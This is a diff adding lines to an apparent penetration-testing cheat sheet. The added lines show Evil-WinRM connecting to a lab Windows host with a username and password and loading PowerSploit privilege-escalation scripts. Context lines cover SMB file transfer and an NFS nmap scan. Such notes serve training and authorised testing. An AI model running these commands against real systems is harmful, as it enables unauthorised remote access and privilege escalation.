@@ -143,6 +143,10 @@ Transfer files from the Kali VM with smbserver.py:
   `# ruby evil-winrm.rb -i 10.10.10.169 -u Hans -p 'Wurst123!' -s /opt/PowerSploit/Privesc/`  
   `*Evil-WinRM* PS C:\Users\Hans\Documents> PowerUp.ps1`  
   Now, locate all imported functions with "menu"   
+- Evil-WinRM with custom scripts:   
+  `# locate PowerSploit/Privesc/Privesc.psd1`   
+  `/opt/PowerSploit/Privesc/Privesc.psd1`   
+  `# ruby evil-winrm.rb -i 10.10.10.169 -u Hans -p 'Wurst123!' -s /opt/PowerSploit/Privesc/`   
 
 ## NFS
  - `nmap -p 111 --script=nfs* -iL nfstargets.txt`  
